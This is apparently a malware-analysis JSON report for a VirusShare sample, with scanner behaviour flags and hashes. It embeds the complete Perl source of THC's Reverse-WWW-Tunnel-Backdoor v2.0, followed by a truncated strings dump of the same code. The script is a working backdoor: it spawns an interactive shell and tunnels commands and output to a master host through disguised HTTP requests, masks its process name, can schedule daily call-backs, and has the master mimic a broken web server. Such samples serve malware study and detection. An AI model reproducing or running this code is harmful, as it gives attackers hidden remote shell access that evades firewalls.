{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "SHELL": "May run an executable file or a system command",
            "binary": "May read or write a binary file",
            "command": "May run PowerShell commands",
            "exec": "May run an executable file or a system command using Excel 4 Macros",
            "kill": "May delete a file",
            "open": "May open a file",
            "output": "May write to a file",
            "run": "May run an executable file or a system command",
            "system": "May run an executable file or a system command on a Mac"
        },
        "macro": "#!/usr/bin/perl\n#\n# Reverse-WWW-Tunnel-Backdoor v2.0\n# (c) 1998-2002 by van Hauser / [THC] - The Hacker's Choice <vh@reptile.rug.ac.be>\n# Check out http://www.thehackerschoice.com\n# Proof-of-Concept Program for the paper \"Placing Backdoors through Firewalls\"\n# available at the website above in the \"Articles\" section.\n#\n\n# Greets to all THC, TESO, ADM and #bluebox guys\n\n# verified to work on Linux, Solaris, AIX and OpenBSD\n\n# BUGS: some Solaris machines: select(3) is broken, won't work there\n#\ton some systems Perl's recv is broken :-( (AIX, OpenBSD) ...\n#\twe can't make proper receive checks here. Workaround implemented.\n#\n# HISTORY:\n# v2.0: HTTP 1.0 protocol compliance (finally ;-)\n# v1.6: included www-proxy authentication ;-))\n# v1.4: porting to various unix types (and I thought perl'd be portable...)\n# v1.3: initial public release of the paper including this tool\n\n#\n# GENERAL CONFIG (except for $MASK, everything must be the same\n#\t\t  for MASTER and SLAVE is this section!)\n#\n$MODE=\"POST\";\t\t\t # GET or POST\n$CGI_PREFIX=\"/cgi-bin/orderform\";# should look like a valid cgi.\n$MASK=\"vi\";\t\t\t # for masking the program's process name\n$PASSWORD=\"THC\";\t\t # anything, nothing you have to rememeber\n\t\t\t\t # (not a real \"password\" anyway)\n#\n# MASTER CONFIG (specific for the MASTER)\n#\n$LISTEN_PORT=8080;\t# on which port to listen (80 [needs root] or 8080)\n$SERVER=\"127.0.0.1\";\t# the host to run on (ip/dns) (the SLAVE needs this!)\n\n#\n# SLAVE CONFIG (specific for the SLAVE)\n#\n$SHELL=\"/bin/sh -i\";\t# program to execute (e.g. /bin/sh)\n$DELAY=\"3\";\t\t# time to wait for output after your command(s)\n#$TIME=\"14:39\";\t\t# time when to connect to the master (unset if now)\n#$DAILY=\"yes\";\t\t# tries to connect once daily if set with something\n#$PROXY=\"127.0.0.1\";\t# set this with the Proxy if you must use one\n#$PROXY_PORT=\"3128\";\t# set this with the Proxy Port if you must use one\n#$PROXY_USER=\"user\";\t# username for proxy authentication\n#$PROXY_PASSWORD=\"pass\";# password for proxy authentication\n#$DEBUG=\"yes\";\t\t# for debugging purpose, turn off when in production\n$BROKEN_RECV=\"yes\";\t# For AIX & OpenBSD, NOT for Linux & Solaris\n\n# END OF CONFIG\t\t# nothing for you to do after this point #\n\n################## BEGIN MAIN CODE ##################\n\nrequire 5.002;\nuse Socket;\n\n$|=1;\t\t\t\t# next line changes our process name\nif ($MASK) { for ($a=1;$a<80;$a++){$MASK=$MASK.\"\\000\";}  $0=$MASK; }\nundef $DAILY   if (! $TIME);\nif ( !($PROXY) || !($PROXY_PORT) ) {\n\tundef $PROXY;\n\tundef $PROXY_PORT;\n}\n$protocol = getprotobyname('tcp');\n\nif ($ARGV[0] ne \"slave\" && $ARGV[0] ne \"daemon\" && $ARGV[0] ne \"master\" && $ARGV[1] eq \"\") {\n\tprint STDOUT \"Proof-of-Concept Program for the paper \\\"Placing Backdoors through Firewalls\\\"\\navailable at http://www.thehackerschoice.com in the \\\"Articles\\\" section.\\n\";\n\tprint STDOUT \"Commandline options for rwwwshell:\\n\\tmaster\\t- master mode\\n\\tslave\\t- slave mode\\n\";\n\texit(0);\n}\n\nif ($ARGV[0] eq \"slave\") {\n\tprint STDOUT \"starting in slave mode\\n\";\n\t$SLAVE_MODE = \"yeah\";\n}\n\n# check for a correct mode\nif ($MODE ne \"GET\" && $MODE ne \"POST\") {\n\tprint STDOUT \"Error: MODE must either be GET or POST, re-edit this perl config\\n\";\n\texit(-1);\n}\n\nif (! $SLAVE_MODE) { \n\t&master;\n} else {\n\t&slave;\n}\n# END OF MAIN FUNCTION\n\n############### SLAVE FUNCTION ###############\n\nsub slave {\n\t$pid = 0;\n\t$PROXY_SUFFIX = \"Host: \" . $SERVER . \"\\r\\nUser-Agent: Mozilla/4.0\\r\\nAccept: text/html, text/plain, image/jpeg, image/*;\\r\\nAccept-Language: en\\r\\n\";\n\tif ($PROXY) {\t\t# setting the real config (for Proxy Support)\n\t\t$REAL_SERVER = $PROXY;\n\t\t$REAL_PORT = $PROXY_PORT;\n\t\t$REAL_PREFIX = $MODE . \" http://\" . $SERVER . \":\" . $LISTEN_PORT\n\t\t\t. $CGI_PREFIX;\n\t\t$PROXY_SUFFIX = $PROXY_SUFFIX . \"Pragma: no-cache\\r\\n\";\n\t\tif ( $PROXY_USER && USER_PASSWORD ) {\n\t\t\t&base64encoding;\n\t\t\t$PROXY_SUFFIX = $PROXY_SUFFIX . $PROXY_COOKIE;\n\t\t}\n\t} else {\n\t\t$REAL_SERVER = $SERVER;\n\t\t$REAL_PORT = $LISTEN_PORT;\n\t\t$REAL_PREFIX = $MODE . \" \" . $CGI_PREFIX;\n\t}\n\t$REAL_PREFIX = $REAL_PREFIX . \"?\"\tif ($MODE eq \"GET\");\n\t$REAL_PREFIX = $REAL_PREFIX . \" HTTP/1.0\\r\\n\"\tif ($MODE eq \"POST\");\nAGAIN:\tif ($pid) { kill 9, $pid; }\n\tif ($TIME) {\t\t\t# wait until the specified $TIME\n\t\t$TIME =~ s/^0//;\t$TIME =~ s/:0/:/;\n\t\t(undef,$min,$hour,undef,undef,undef,undef,undef,undef)\n\t\t\t= localtime(time);\n\t\t$t=$hour . \":\" . $min;\n\t\twhile ($TIME ne $t) {\n\t\t\tsleep(28); # every 28 seconds we look at the watch\n\t\t\t(undef,$min,$hour,undef,undef,undef,undef,undef,undef)\n\t\t\t\t= localtime(time);\n\t\t\t$t=$hour . \":\" .$min;\n\t\t}\n\t}\n\tprint STDERR \"Slave activated\\n\"\tif $DEBUG;\n\tif ($DAILY) {\t\t\t# if we must connect daily, we'll\n\t\tif (fork) {\t\t# fork the daily shell process to\n\t\t\tsleep(69);\t# ensure the master control process\n\t\t\tgoto AGAIN;\t# won't get stuck by a fucking cmd\n\t\t}\t\t\t# the user executed.\n\tprint STDERR \"forked\\n\" if $DEBUG;\n\t}\n\t$address = inet_aton($REAL_SERVER) || die \"can't resolve server\\n\";\n\t$remote = sockaddr_in($REAL_PORT, $address);\n\t$forked = 0;\nGO:\tclose(THC);\n\tsocket(THC, &PF_INET, &SOCK_STREAM, $protocol)\n\t\tor die \"can't create socket\\n\";\n\tsetsockopt(THC, SOL_SOCKET, SO_REUSEADDR, 1);\n\tif (! $forked) {\t\t# fork failed? fuck, let's try again\n\t\tpipe R_IN, W_IN;        select W_IN;  $|=1;\n\t\tpipe R_OUT, W_OUT;      select W_OUT; $|=1;\n\t\t$pid = fork;\n\t\tif (! defined $pid) {\n\t\t\tclose THC;\n\t\t\tclose R_IN;\tclose W_IN;\n\t\t\tclose R_OUT;\tclose W_OUT;\n\t\t\tgoto GO;\n\t\t}\n\t\t$forked = 1;\n\t}\n\tif (! $pid) {           # this is the child process (execs $SHELL)\n\t\tclose R_OUT;\tclose W_IN;\tclose THC;\n\t\tprint STDERR \"forking $SHELL in child\\n\"\tif $DEBUG;\n\t\topen STDIN,  \"<&R_IN\";\n\t\topen STDOUT, \">&W_OUT\";\n\t\topen STDERR, \">&W_OUT\";\n\t\texec $SHELL || print W_OUT \"couldn't spawn $SHELL\\n\";\n\t\tclose R_IN;     close W_OUT;\n\t\texit(0);\n\t} else {                # this is the parent (data control + network)\n\t\tclose R_IN;\n\t\tsleep($DELAY);\t# we wait $DELAY for the commands to complete\n\t\tvec($rs, fileno(R_OUT), 1) = 1;\n\t\tprint STDERR \"before: allwritten2stdin\\n\"\tif $DEBUG;\n\t\tselect($r = $rs, undef, undef, 30);\n\t\tprint STDERR \"after : wait for allwritten2stdin\\n\" if $DEBUG;\n\t\tsleep(1);\t# The following readin of the command output\n\t\t$output = \"\";\t# looks weird. It must be! every system\n\t\tvec($ws, fileno(W_OUT), 1) = 1;     # behaves different :-((\n\t\tprint STDERR \"before: readwhiledatafromstdout\\n\"   if $DEBUG;\n\t\twhile (select($w = $ws, undef, undef, 1)) {\n\t\t\tread R_OUT, $readout, 1 || last;\n\t\t\t$output = $output . $readout;\n\t\t}\n\t\tprint STDERR \"after : readwhiledatafromstdout\\n\"   if $DEBUG;\n\t\tprint STDERR \"before: fucksunprob\\n\"\tif $DEBUG;\n\t\tvec($ws, fileno(W_OUT), 1) = 1;\n\t\twhile (! select(undef, $w=$ws, undef, 0.001)) {\n\t\t\tread R_OUT, $readout, 1 || last;\n\t\t\t$output = $output . $readout;\n\t\t}\n\t\tprint STDERR \"after : fucksunprob\\n\"\tif $DEBUG;\n\t\tprint STDERR \"send 0byte to stdout, fail->exit\\n\"   if $DEBUG;\n\t\tprint W_OUT \"\\000\" || goto END_IT;\n\t\tprint STDERR \"before: readallstdoutdatawhile!eod\\n\" if $DEBUG;\n\t\twhile (1) {\n\t\t\tread R_OUT, $readout, 1 || last;\n\t\t\tlast  if ($readout eq \"\\000\");\n\t\t\t$output = $output . $readout;\n\t\t}\n\t\tprint STDERR \"after : readallstdoutdatawhile!eod\\n\" if $DEBUG;\n\t\t&uuencode;\t# does the encoding of the shell output\n\t\tif ($MODE eq \"GET\") {\n\t\t\t$encoded = $REAL_PREFIX . $encoded . \" HTTP/1.0\\r\\n\";\n\t\t\t$encoded = $encoded . $PROXY_SUFFIX;\n\t\t\t$encoded = $encoded . \"\\r\\n\";\n\t\t} else {\t# $MODE is \"POST\"\n\t\t\t$encoded = $REAL_PREFIX . $PROXY_SUFFIX\n\t\t\t . \"Content-Type: application/x-www-form-urlencoded\\r\\n\\r\\n\"\n\t\t\t . $encoded . \"\\r\\n\";\n\t\t}\n\t\tprint STDERR \"connecting to remote, fail->exit\\n\" if $DEBUG;\n\t\tconnect(THC, $remote) || goto END_IT;\t# connect to master\n\t\tprint STDERR \"send encoded data, fail->exit\\n\" if $DEBUG;\n\t\tsend (THC, $encoded, 0) || goto END_IT;\t# and send data\n\t\t$input = \"\";\n\t\tvec($rt, fileno(THC), 1) = 1;  # wait until master sends reply\n\t\tprint STDERR \"before: wait4answerfromremote\\n\"\tif $DEBUG;\n\t\twhile (! select($r = $rt, undef, undef, 0.00001)) {}\n\t\tprint STDERR \"after : wait4answerfromremote\\n\"\tif $DEBUG;\n\t\tprint STDERR \"read data from socket until eod\\n\" if $DEBUG;\n\t\t$error=\"no\";\n#\t\twhile (1) {\t\t# read until EOD (End Of Data)\n\t\t\tprint STDERR \"?\"\tif $DEBUG;\n\t# OpenBSD 2.2 can't recv here! can't get any data! sucks ...\n\t\t\trecv (THC, $readin, 16386, 0) || undef $error;\n#\t\t\tif ((! $error) and (! $BROKEN_RECV)) { goto OK; }\n\t\t\tprint STDERR \"!\"\tif $DEBUG;\n\t\t\tgoto OK  if (($readin eq \"\\000\") or ($readin eq \"\\n\")\n\t\t\t\tor ($readin eq \"\"));\n\t\t\t$input = $input . $readin;\n#\t\t}\nOK:\t\tprint STDERR \"\\nall data read, entering OK\\n\"\tif $DEBUG;\n\t\tprint STDERR \"RECEIVE: $input\\n\"\tif $DEBUG;\n\t\t$input =~ s/.*\\r\\n\\r\\n//s;\n\t\tprint STDERR \"BEFORE DECODING: $input\\n\"\tif $DEBUG;\n\t\t&uudecode;\t\t# decoding the data from the master\n\t\tprint STDERR \"AFTER DECODING: $decoded\\n\"\tif $DEBUG;\n\t\tprint STDERR \"if password not found -> exit\\n\"\tif $DEBUG;\n\t\tgoto END_IT\tif ($decoded =~ m/^$PASSWORD/s == 0);\n\t\t$decoded =~ s/^$PASSWORD//;\n\t\tprint STDERR \"writing input data to $SHELL\\n\"\tif $DEBUG;\n\t\tprint W_IN \"$decoded\" || goto END_IT;\t# sending the data\n\t\tsleep(1);\t\t\t\t# to the shell proc.\n\t\tprint STDERR \"jumping to GO\\n\"\tif $DEBUG;\n\t\tgoto GO;\n\t}\nEND_IT:\tkill 9, $pid;\t$pid = 0;\n\texit(0);\n} # END OF SLAVE FUNCTION\n\n############### MASTER FUNCTION ###############\n\nsub master {\n\tsocket(THC, &PF_INET, &SOCK_STREAM, $protocol)\n\t\tor die \"can't create socket\\n\";\n\tsetsockopt(THC, SOL_SOCKET, SO_REUSEADDR, 1);\n\tbind(THC, sockaddr_in($LISTEN_PORT, INADDR_ANY)) || die \"can't bind\\n\";\n\tlisten(THC, 3) || die \"can't listen\\n\";\t\t# print the HELP\n\tprint STDOUT '\nWelcome to the Reverse-WWW-Tunnel-Backdoor v2.0 by van Hauser / THC ...\n\nIntroduction: \tWait for your SLAVE to connect, examine it\\'s output and then\n\t\ttype in your commands to execute on SLAVE. You\\'ll have to\n\t\twait min. the set $DELAY seconds before you get the output\n\t\tand can execute the next stuff. Use \";\" for multiple commands.\n\t\tTrying to execute interactive commands may give you headache\n\t\tso beware. Your SLAVE may hang until the daily connect try\n\t\t(if set - otherwise you lost).\n\t\tYou also shouldn\\'t try to view binary data too ;-)\n\t\t\"echo bla >> file\", \"cat >> file <<- EOF\", sed etc. are your\n\t\tfriends if you don\\'t like using vi in a delayed line mode ;-)\n\t\tTo exit this program on any time without doing harm to either\n\t\tMASTER or SLAVE just press Control-C.\n\t\tNow have fun.\n';\n\nYOP:\tprint STDOUT \"\\nWaiting for connect ...\";\n\t$remote=accept (S, THC)  ||  goto YOP;\t\t# get the connection\n\t($r_port, $r_slave)=sockaddr_in($remote);\t# and print the SLAVE\n\t$slave=gethostbyaddr($r_slave, AF_INET);\t# data.\n\t$slave=\"unresolved\" if ($slave eq \"\");\n\tprint STDOUT \" connect from $slave/\".inet_ntoa($r_slave).\":$r_port\\n\";\n\tselect S;\t$|=1;\n\tselect STDOUT;\t$|=1;\n\t$input = \"\";\n\tvec($socks, fileno(S), 1) = 1;\n\t$error=\"no\";\n#\twhile (1) {\t\t\t# read the data sent by the slave\n\t\twhile (! select($r = $socks, undef, undef, 0.00001)) {}\n\t\trecv (S, $readin, 16386, 0) || undef $error;\n\t\tif ((! $error) and (! $BROKEN_RECV)) {\n\t\t    print STDOUT \"[disconnected]\\n\";\n\t\t}\n#\t\t$readin =~ s/\\r//g;\n#\t\t$input = $input . $readin;\n#\t\tlast  if ( $input =~ m/\\r\\n\\r\\n/s );\n\t\t$input = $readin;\n\t\tprint STDERR \"MASTER RECEIVE: $input\\n\"\tif $DEBUG;\n#\t}\n\t&hide_as_broken_webserver  if ( $input =~ m/$CGI_PREFIX/s == 0 );\n\tif ( $input =~ m/^GET /s ) {\n\t\t$input =~ s/^.*($CGI_PREFIX)\\??//s;\n\t\t$input =~ s/\\r\\n.*$//s;\n\t} else { if ( $input =~ m/^POST /s ) {\n\t\t$input =~ s/^.*\\r\\n\\r\\n//s;\n\t} else { if ( $input =~ m/^HEAD /s ) {\n\t\t&hide_as_broken_webserver;\n\t} else {\n\t\tclose S;\n\t\tprint STDOUT \"Warning! Illegal server access!\\n\";   # report to user\n\t\tgoto YOP;\n\t} } }\n\tprint STDERR \"BEFORE DECODING: $input\\n\"\tif $DEBUG;\n\t&uudecode;\t\t# decoding the data from the slave\n\t&hide_as_broken_webserver  if ( $decoded =~ m/^$PASSWORD/s == 0 );\n\t$decoded =~ s/^$PASSWORD//s;\n\t$decoded = \"[Warning! No output from remote!]\\n>\" if ($decoded eq \"\");\n\tprint STDOUT \"$decoded\";\t# showing the slave output to the user\n\t$output = <STDIN>;\t\t# and get his input.\n\t&uuencode;\t\t# encode the data for the slave\n\t$encoded = \"HTTP/1.1 200 OK\\r\\nConnection: close\\r\\nContent-Type: text/plain\\r\\n\\r\\n\" . $encoded . \"\\r\\n\";\n\tsend (S, $encoded, 0) || die \"\\nconnection lost!\\n\";\t# and send it\n\tclose (S);\n\tprint STDOUT \"sent.\\n\";\n\tgoto YOP;\t\t# wait for the next connect from the slave\n} # END OF MASTER FUNCTION\n\n###################### MISC. FUNCTIONS #####################\n\nsub uuencode {\t# does the encoding stuff for error-free data transfer via WWW\n\t$output = $PASSWORD . $output;\t\t# PW is for error checking and\n        $uuencoded = pack \"u\", \"$output\";\t# preventing sysadmins from\n        $uuencoded =~ tr/'\\n)=(:;&><,#$*%]!\\@\"`\\\\\\-'\t# sending you weird\n                        /'zcadefghjklmnopqrstuv'\t# data. No real\n                        /;\t\t\t\t# security!\n        $uuencoded =~ tr/\"'\"/'b'/;\n\tif ( ($PROXY) && ($SLAVE_MODE) ) {# proxy drops request if > 4kb\n\t\t$codelength = (length $uuencoded) + (length $REAL_PREFIX) +12;\n\t\t$cut_length = 4099 - (length $REAL_PREFIX);\n\t\t$uuencoded = pack \"a$cut_length\", $uuencoded\n\t\t\tif ($codelength > 4111);\n\t}\n        $encoded = $uuencoded;\n} # END OF UUENCODE FUNCTION\n\nsub uudecode {\t# does the decoding of the data stream\n\t$input =~     tr/'zcadefghjklmnopqrstuv'\n\t\t\t/'\\n)=(:;&><,#$*%]!\\@\"`\\\\\\-'\n\t\t\t/;\n\t$input =~     tr/'b'/\"'\"/;\n\t$decoded = unpack \"u\", \"$input\";\n} # END OF UUDECODE FUNCTION\n\nsub base64encoding {\t# does the base64 encoding for proxy passwords\n\t$encode_string = $PROXY_USER . \":\" . $PROXY_PASSWORD;\n\t$encoded_string = substr(pack('u', $encode_string), 1);\n\tchomp($encoded_string);\n\t$encoded_string =~ tr|` -_|AA-Za-z0-9+/|;\n\t$padding = (3 - length($encode_string) % 3) % 3;\n\t$encoded_string =~ s/.{$padding}$/'=' x $padding/e if $padding;\n\t$PROXY_COOKIE = \"Proxy-authorization: Basic \" . $encoded_string . \"\\n\";\n} # END OF BASE64ENCODING FUNCTION\n\nsub hide_as_broken_webserver {\t# invalid request -> look like broken server\n\tsend (S, \"<HTML><HEAD>\\r\\n<TITLE>404 File Not Found</TITLE>\\r\\n</HEAD>\".\n\t\t \"<BODY>\\r\\n<H1>File Not Found</H1>\\r\\n</BODY></HTML>\\r\\n\", 0);\n\tclose S;\n\tprint STDOUT \"Warning! Illegal server access!\\n\";   # report to user\n\tgoto YOP;\n} # END OF HIDE_AS_BROKEN_WEBSERVER FUNCTION\n\n# END OF PROGRAM # (c) 1998-2002 by <vh@reptile.rug.ac.be>"
    },
    "filename": "VirusShare_43878695a6b3028af23c072d92736616",
    "filesize": 14154,
    "filetype": "Perl script text executable",
    "hashes": {
        "md5": "43878695a6b3028af23c072d92736616",
        "sha1": "5737d114edc8b0d8fc18fc3bfe4c5629407ad263",
        "sha256": "81c3c2b3e19b103ada6d293b3fd4fd19f96a17756bef16080cdf05649cd53c08"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "#!/usr/bin/perl",
            "# Reverse-WWW-Tunnel-Backdoor v2.0",
            "# (c) 1998-2002 by van Hauser / [THC] - The Hacker's Choice <vh@reptile.rug.ac.be>",
            "# Check out http://www.thehackerschoice.com",
            "# Proof-of-Concept Program for the paper \"Placing Backdoors through Firewalls\"",
            "# available at the website above in the \"Articles\" section.",
            "# Greets to all THC, TESO, ADM and #bluebox guys",
            "# verified to work on Linux, Solaris, AIX and OpenBSD",
            "# BUGS: some Solaris machines: select(3) is broken, won't work there",
            "#\ton some systems Perl's recv is broken :-( (AIX, OpenBSD) ...",
            "#\twe can't make proper receive checks here. Workaround implemented.",
            "# HISTORY:",
            "# v2.0: HTTP 1.0 protocol compliance (finally ;-)",
            "# v1.6: included www-proxy authentication ;-))",
            "# v1.4: porting to various unix types (and I thought perl'd be portable...)",
            "# v1.3: initial public release of the paper including this tool",
            "# GENERAL CONFIG (except for $MASK, everything must be the same",
            "#\t\t  for MASTER and SLAVE is this section!)",
            "$MODE=\"POST\";\t\t\t # GET or POST",
            "$CGI_PREFIX=\"/cgi-bin/orderform\";# should look like a valid cgi.",
            "$MASK=\"vi\";\t\t\t # for masking the program's process name",
            "$PASSWORD=\"THC\";\t\t # anything, nothing you have to rememeber",
            "\t\t\t\t # (not a real \"password\" anyway)",
            "# MASTER CONFIG (specific for the MASTER)",
            "$LISTEN_PORT=8080;\t# on which port to listen (80 [needs root] or 8080)",
            "$SERVER=\"127.0.0.1\";\t# the host to run on (ip/dns) (the SLAVE needs this!)",
            "# SLAVE CONFIG (specific for the SLAVE)",
            "$SHELL=\"/bin/sh -i\";\t# program to execute (e.g. /bin/sh)",
            "$DELAY=\"3\";\t\t# time to wait for output after your command(s)",
            "#$TIME=\"14:39\";\t\t# time when to connect to the master (unset if now)",
            "#$DAILY=\"yes\";\t\t# tries to connect once daily if set with something",
            "#$PROXY=\"127.0.0.1\";\t# set this with the Proxy if you must use one",
            "#$PROXY_PORT=\"3128\";\t# set this with the Proxy Port if you must use one",
            "#$PROXY_USER=\"user\";\t# username for proxy authentication",
            "#$PROXY_PASSWORD=\"pass\";# password for proxy authentication",
            "#$DEBUG=\"yes\";\t\t# for debugging purpose, turn off when in production",
            "$BROKEN_RECV=\"yes\";\t# For AIX & OpenBSD, NOT for Linux & Solaris",
            "# END OF CONFIG\t\t# nothing for you to do after this point #",
            "################## BEGIN MAIN CODE ##################",
            "require 5.002;",
            "use Socket;",
            "$|=1;\t\t\t\t# next line changes our process name",
            "if ($MASK) { for ($a=1;$a<80;$a++){$MASK=$MASK.\"\\000\";}  $0=$MASK; }",
            "undef $DAILY   if (! $TIME);",
            "if ( !($PROXY) || !($PROXY_PORT) ) {",
            "\tundef $PROXY;",
            "\tundef $PROXY_PORT;",
            "$protocol = getprotobyname('tcp');",
            "if ($ARGV[0] ne \"slave\" && $ARGV[0] ne \"daemon\" && $ARGV[0] ne \"master\" && $ARGV[1] eq \"\") {",
            "\tprint STDOUT \"Proof-of-Concept Program for the paper \\\"Placing Backdoors through Firewalls\\\"\\navailable at http://www.thehackerschoice.com in the \\\"Articles\\\" section.\\n\";",
            "\tprint STDOUT \"Commandline options for rwwwshell:\\n\\tmaster\\t- master mode\\n\\tslave\\t- slave mode\\n\";",
            "\texit(0);",
            "if ($ARGV[0] eq \"slave\") {",
            "\tprint STDOUT \"starting in slave mode\\n\";",
            "\t$SLAVE_MODE = \"yeah\";",
            "# check for a correct mode",
            "if ($MODE ne \"GET\" && $MODE ne \"POST\") {",
            "\tprint STDOUT \"Error: MODE must either be GET or POST, re-edit this perl config\\n\";",
            "\texit(-1);",
            "if (! $SLAVE_MODE) { ",
            "\t&master;",
            "} else {",
            "\t&slave;",
            "# END OF MAIN FUNCTION",
            "############### SLAVE FUNCTION ###############",
            "sub slave {",
            "\t$pid = 0;",
            "\t$PROXY_SUFFIX = \"Host: \" . $SERVER . \"\\r\\nUser-Agent: Mozilla/4.0\\r\\nAccept: text/html, text/plain, image/jpeg, image/*;\\r\\nAccept-Language: en\\r\\n\";",
            "\tif ($PROXY) {\t\t# setting the real config (for Proxy Support)",
            "\t\t$REAL_SERVER = $PROXY;",
            "\t\t$REAL_PORT = $PROXY_PORT;",
            "\t\t$REAL_PREFIX = $MODE . \" http://\" . $SERVER . \":\" . $LISTEN_PORT",
            "\t\t\t. $CGI_PREFIX;",
            "\t\t$PROXY_SUFFIX = $PROXY_SUFFIX . \"Pragma: no-cache\\r\\n\";",
            "\t\tif ( $PROXY_USER && USER_PASSWORD ) {",
            "\t\t\t&base64encoding;",
            "\t\t\t$PROXY_SUFFIX = $PROXY_SUFFIX . $PROXY_COOKIE;",
            "\t} else {",
            "\t\t$REAL_SERVER = $SERVER;",
            "\t\t$REAL_PORT = $LISTEN_PORT;",
            "\t\t$REAL_PREFIX = $MODE . \" \" . $CGI_PREFIX;",
            "\t$REAL_PREFIX = $REAL_PREFIX . \"?\"\tif ($MODE eq \"GET\");",
            "\t$REAL_PREFIX = $REAL_PREFIX . \" HTTP/1.0\\r\\n\"\tif ($MODE eq \"POST\");",
            "AGAIN:\tif ($pid) { kill 9, $pid; }",
            "\tif ($TIME) {\t\t\t# wait until the specified $TIME",
            "\t\t$TIME =~ s/^0//;\t$TIME =~ s/:0/:/;",
            "\t\t(undef,$min,$hour,undef,undef,undef,undef,undef,undef)",
            "\t\t\t= localtime(time);",
            "\t\t$t=$hour . \":\" . $min;",
            "\t\twhile ($TIME ne $t) {",
            "\t\t\tsleep(28); # every 28 seconds we look at the watch",
            "\t\t\t(undef,$min,$hour,undef,undef,undef,undef,undef,undef)",
            "\t\t\t\t= localtime(time);",
            "\t\t\t$t=$hour . \":\" .$min;",
            "\tprint STDERR \"Slave activated\\n\"\tif $DEBUG;",
            "\tif ($DAILY) {\t\t\t# if we must connect daily, we'll",
            "\t\tif (fork) {\t\t# fork the daily shell process to",
            "\t\t\tsleep(69);\t# ensure the master control process",
            "\t\t\tgoto AGAIN;\t# won't get stuck by a fucking cmd",
            "\t\t}\t\t\t# the user executed.",
            "\tprint STDERR \"forked\\n\" if $DEBUG;",
            "\t$address = inet_aton($REAL_SERVER) || die \"can't resolve server\\n\";",
            "\t$remote = sockaddr_in($REAL_PORT, $address);",
            "\t$forked = 0;",
            "GO:\tclose(THC);",
            "\tsocket(THC, &PF_INET, &SOCK_STREAM, $protocol)",
            "\t\tor die \"can't create socket\\n\";",
            "\tsetsockopt(THC, SOL_SOCKET, SO_REUSEADDR, 1);",
            "\tif (! $forked) {\t\t# fork failed? fuck, let's try again",
            "\t\tpipe R_IN, W_IN;        select W_IN;  $|=1;",
            "\t\tpipe R_OUT, W_OUT;      select W_OUT; $|=1;",
            "\t\t$pid = fork;",
            "\t\tif (! defined $pid) {",
            "\t\t\tclose THC;",
            "\t\t\tclose R_IN;\tclose W_IN;",
            "\t\t\tclose R_OUT;\tclose W_OUT;",
            "\t\t\tgoto GO;",
            "\t\t$forked = 1;",
            "\tif (! $pid) {           # this is the child process (execs $SHELL)",
            "\t\tclose R_OUT;\tclose W_IN;\tclose THC;",
            "\t\tprint STDERR \"forking $SHELL in child\\n\"\tif $DEBUG;",
            "\t\topen STDIN,  \"<&R_IN\";",
            "\t\topen STDOUT, \">&W_OUT\";",
            "\t\topen STDERR, \">&W_OUT\";",
            "\t\texec $SHELL || print W_OUT \"couldn't spawn $SHELL\\n\";",
            "\t\tclose R_IN;     close W_OUT;",
            "\t\texit(0);",
            "\t} else {                # this is the parent (data control + network)",
            "\t\tclose R_IN;",
            "\t\tsleep($DELAY);\t# we wait $DELAY for the commands to complete",
            "\t\tvec($rs, fileno(R_OUT), 1) = 1;",
            "\t\tprint STDERR \"before: allwritten2stdin\\n\"\tif $DEBUG;",
            "\t\tselect($r = $rs, undef, undef, 30);",
            "\t\tprint STDERR \"after : wait for allwritten2stdin\\n\" if $DEBUG;",
            "\t\tsleep(1);\t# The following readin of the command output",
            "\t\t$output = \"\";\t# looks weird. It must be! every system",
            "\t\tvec($ws, fileno(W_OUT), 1) = 1;     # behaves different :-((",
            "\t\tprint STDERR \"before: readwhiledatafromstdout\\n\"   if $DEBUG;",
            "\t\twhile (select($w = $ws, undef, undef, 1)) {",
            "\t\t\tread R_OUT, $readout, 1 || last;",
            "\t\t\t$output = $output . $readout;",
            "\t\tprint STDERR \"after : readwhiledatafromstdout\\n\"   if $DEBUG;",
            "\t\tprint STDERR \"before: fucksunprob\\n\"\tif $DEBUG;",
            "\t\tvec($ws, fileno(W_OUT), 1) = 1;",
            "\t\twhile (! select(undef, $w=$ws, undef, 0.001)) {",
            "\t\t\tread R_OUT, $readout, 1 || last;",
            "\t\t\t$output = $output . $readout;",
            "\t\tprint STDERR \"after : fucksunprob\\n\"\tif $DEBUG;",
            "\t\tprint STDERR \"send 0byte to stdout, fail->exit\\n\"   if $DEBUG;",
            "\t\tprint W_OUT \"\\000\" || goto END_IT;",
            "\t\tprint STDERR \"before: readallstdoutdatawhile!eod\\n\" if $DEBUG;",
            "\t\twhile (1) {",
            "\t\t\tread R_OUT, $readout, 1 || last;",
            "\t\t\tlast  if ($readout eq \"\\000\");",
            "\t\t\t$output = $output . $readout;",
            "\t\tprint STDERR \"after : readallstdoutdatawhile!eod\\n\" if $DEBUG;",
            "\t\t&uuencode;\t# does the encoding of the shell output",
            "\t\tif ($MODE eq \"GET\") {",
            "\t\t\t$encoded = $REAL_PREFIX . $encoded . \" HTTP/1.0\\r\\n\";",
            "\t\t\t$encoded = $encoded . $PROXY_SUFFIX;",
            "\t\t\t$encoded = $encoded . \"\\r\\n\";",
            "\t\t} else {\t# $MODE is \"POST\"",
            "\t\t\t$encoded = $REAL_PREFIX . $PROXY_SUFFIX",
            "\t\t\t . \"Content-Type: application/x-www-form-urlencoded\\r\\n\\r\\n\"",
            "\t\t\t . $encoded . \"\\r\\n\";",
            "\t\tprint STDERR \"connecting to remote, fail->exit\\n\" if $DEBUG;",
            "\t\tconnect(THC, $remote) || goto END_IT;\t# connect to master",
            "\t\tprint STDERR \"send encoded data, fail->exit\\n\" if $DEBUG;",
            "\t\tsend (THC, $encoded, 0) || goto END_IT;\t# and send data",
            "\t\t$input = \"\";",
            "\t\tvec($rt, fileno(THC), 1) = 1;  # wait until master sends reply",
            "\t\tprint STDERR \"before: wait4answerfromremote\\n\"\tif $DEBUG;",
            "\t\twhile (! select($r = $rt, undef, undef, 0.00001)) {}",
            "\t\tprint STDERR \"after : wait4answerfromremote\\n\"\tif $DEBUG;",
            "\t\tprint STDERR \"read data from socket until eod\\n\" if $DEBUG;",
            "\t\t$error=\"no\";",
            "#\t\twhile (1) {\t\t# read until EOD (End Of Data)",
            "\t\t\tprint STDERR \"?\"\tif $DEBUG;",
            "\t# OpenBSD 2.2 can't recv here! can't get any data! sucks ...",
            "\t\t\trecv (THC, $readin, 16386, 0) || undef $error;",
            "#\t\t\tif ((! $error) and (! $BROKEN_RECV)) { goto OK; }",
